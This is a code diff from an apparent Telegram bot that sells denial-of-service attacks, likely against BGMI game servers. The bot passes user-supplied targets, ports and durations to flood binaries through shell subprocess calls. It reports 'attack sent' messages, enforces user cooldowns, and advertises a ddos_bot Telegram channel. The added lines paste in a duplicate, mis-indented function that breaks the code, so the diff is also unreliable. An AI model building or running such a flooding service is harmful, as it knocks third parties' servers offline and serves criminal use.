@@ -262,11 +262,22 @@ def start_attack(user_id, target, port, duration):
     log_command(user_id, target, port, duration)
     response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration}\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿 𝗡𝗮𝗺𝗲: {username}"
     bot.send_message(user_id, response)
+def start_attack(message):
+    user_name = message.from_user.first_name
+    response = f'𝐇𝐄𝐘 👋 {user_name}!\n\n'
+    response += 'Special Massage 💥\n\n'
+    response += ':--> Please send Ss or feedback otherwise you will be banned 🚫\n'
+     keyboard = telebot.types.InlineKeyboardMarkup()
+    keyboard.row(
+        telebot.types.InlineKeyboardButton('Updates', url='https://t.me/ddos_bot_07'),
+        telebot.types.InlineKeyboardButton('SUPPORT', url='https://t.me/ddos_bot_07')  
+    )
+
+    bot.reply_to(message, response, reply_markup=keyboard)
     try:
         ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 200", shell=True)
         time.sleep(5)
         subprocess.run(f"./{bgmi2_file} {target} {port} {duration} 200", shell=True)
-        process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 60")
       # Set cooldown for normal users after a successful attack
         if user_id not in ADMIN_IDS:
             user_cooldowns[user_id] = datetime.datetime.now()
